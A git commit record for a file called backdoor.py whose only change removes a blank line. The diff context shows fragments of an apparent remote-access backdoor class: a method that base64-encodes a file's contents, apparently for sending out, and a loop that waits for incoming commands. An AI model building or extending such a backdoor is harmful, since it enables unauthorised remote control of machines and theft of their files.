dd37aaf983b144a304ac396046a5a6aeb455b10b
SecureUniverse <64855572+SecureUniverse@users.noreply.github.com>
2021-10-20 17:38:42 +0330

    Update backdoor.py

--- backdoor.py
+++ backdoor.py
@@ -39,7 +39,6 @@ class Backdoor:
         with open(path, "rb") as file:
             return base64.b64encode(file.read())
 
-
     def run(self):
         while True:
             command = self.reliable_receive()
